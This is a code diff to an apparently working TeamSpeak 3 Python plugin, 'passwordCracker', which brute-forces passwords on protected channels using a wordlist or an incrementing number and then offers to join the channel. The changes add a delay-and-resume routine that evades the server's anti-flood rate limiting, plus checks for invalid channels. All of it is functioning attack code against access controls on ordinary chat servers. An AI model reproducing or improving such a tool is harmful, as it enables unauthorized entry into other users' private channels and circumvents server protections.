@@ -56,7 +56,7 @@ class passwordCracker(ts3plugin):
     description = "<insert lenny face here>"
     offersConfigure = False
     commandKeyword = ""
-    infoTitle = "[b]PW Cracker[/b]"
+    infoTitle = "[b]Cracking Password...[/b]"
     menuItems = [
         (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 0, "== {0} ==".format(name), ""),
         (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 1, "Stop Cracker", ""),
@@ -77,6 +77,7 @@ class passwordCracker(ts3plugin):
     pwc = 0
     timer = QTimer()
     interval = 250
+    antiflood_delay = 1000
     step = 1
     retcode = ""
     mode = 0
@@ -97,22 +98,28 @@ class passwordCracker(ts3plugin):
         # ts3lib.setPluginMenuEnabled(PluginHost.globalMenuID(self, ), False)
         # ts3lib.setPluginMenuEnabled(0, False)
 
-    def startTimer(self, schid, cid):
-        (err, haspw) = ts3lib.getChannelVariable(schid, cid, ts3defines.ChannelProperties.CHANNEL_FLAG_PASSWORD)
-        if not haspw:
-            (err, name) = ts3lib.getChannelVariable(schid, cid, ts3defines.ChannelProperties.CHANNEL_NAME)
-            msgBox("Channel \"{0}\" has no password to crack!".format(name), QMessageBox.Warning);return
-        self.schid = schid
-        self.cid = cid
+    def startTimer(self, schid=0, cid=0):
+        if schid != 0: self.schid = schid
+        if cid != 0: self.cid = cid
         self.timer.start(self.interval)
         ts3lib.printMessageToCurrentTab('Timer started!')
 
     def onMenuItemEvent(self, schid, atype, menuItemID, selectedItemID):
         if atype == ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_CHANNEL:
             if menuItemID == 1:
+                (err, haspw) = ts3lib.getChannelVariable(schid, selectedItemID, ts3defines.ChannelProperties.CHANNEL_FLAG_PASSWORD)
+                if not haspw:
+                    (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ts3defines.ChannelProperties.CHANNEL_NAME)
+                    msgBox("Channel \"{0}\" has no password to crack!".format(name), QMessageBox.Warning);return
                 self.mode = 0
+                self.step = 1
+                self.pwc = 0
                 self.startTimer(schid, selectedItemID)
             elif menuItemID == 2:
+                (err, haspw) = ts3lib.getChannelVariable(schid, selectedItemID, ts3defines.ChannelProperties.CHANNEL_FLAG_PASSWORD)
+                if not haspw:
+                    (err, name) = ts3lib.getChannelVariable(schid, selectedItemID, ts3defines.ChannelProperties.CHANNEL_NAME)
+                    msgBox("Channel \"{0}\" has no password to crack!".format(name), QMessageBox.Warning);return
                 self.mode = 1
                 step = inputBox(self.name, 'How much to increase per try?')
                 if step: self.step = int(step)
@@ -173,16 +180,24 @@ class passwordCracker(ts3plugin):
     def onServerErrorEvent(self, schid, errorMessage, error, returnCode, extraMessage):
         if not returnCode == self.retcode: return
         ts3lib.requestInfoUpdate(schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
-        if not error == ts3defines.ERROR_ok: return 1
-        self.timer.stop()
-        (err, name) = ts3lib.getChannelVariable(schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
-        ts3lib.printMessageToCurrentTab('Channel: {0} Password: \"{1}\"'.format(channelURL(schid, self.cid, name), self.pws[self.pwc-1] if self.mode == 0 else self.pwc-1))
-        if confirm("Password found! ({0} / {1})".format(self.pwc, len(self.pws)) if self.mode == 0 else "Password found!",
-                   "Password \"{0}\" was found for channel \"{1}\"\n\nDo you want to join now?".format(self.pws[self.pwc-1] if self.mode == 0 else self.pwc-1,name)):
-            (err, ownID) = ts3lib.getClientID(schid)
-            ts3lib.requestClientMove(schid, ownID, self.cid, self.pws[self.pwc-1] if self.mode == 0 else str(self.pwc-1))
-        self.schid = 0;self.cid = 0;self.pwc = 0
-        ts3lib.requestInfoUpdate(schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
+        if error == ts3defines.ERROR_client_is_flooding:
+            self.timer.stop()
+            QTimer.singleShot(self.antiflood_delay, self.startTimer)
+        elif error == ts3defines.ERROR_channel_invalid_id:
+            self.timer.stop()
+            msgBox("Channel #{0} is invalid!\n\nStopping Cracker!".format(self.cid), QMessageBox.Warning)
+            ts3lib.requestInfoUpdate(schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
+            self.schid = 0;self.cid = 0;self.pwc = 0
+        elif error == ts3defines.ERROR_ok:
+            self.timer.stop()
+            (err, name) = ts3lib.getChannelVariable(schid, self.cid, ts3defines.ChannelProperties.CHANNEL_NAME)
+            ts3lib.printMessageToCurrentTab('Channel: {0} Password: \"{1}\"'.format(channelURL(schid, self.cid, name), self.pws[self.pwc-1] if self.mode == 0 else self.pwc-1))
+            if confirm("Password found! ({0} / {1})".format(self.pwc, len(self.pws)) if self.mode == 0 else "Password found!",
+                       "Password \"{0}\" was found for channel \"{1}\"\n\nDo you want to join now?".format(self.pws[self.pwc-1] if self.mode == 0 else self.pwc-1,name)):
+                (err, ownID) = ts3lib.getClientID(schid)
+                ts3lib.requestClientMove(schid, ownID, self.cid, self.pws[self.pwc-1] if self.mode == 0 else str(self.pwc-1))
+            ts3lib.requestInfoUpdate(schid, ts3defines.PluginItemType.PLUGIN_CHANNEL, self.cid)
+            self.schid = 0;self.cid = 0;self.pwc = 0
         return 1
 
     def onClientMoveEvent(self, schid, clientID, oldChannelID, newChannelID, visibility, moveMessage):
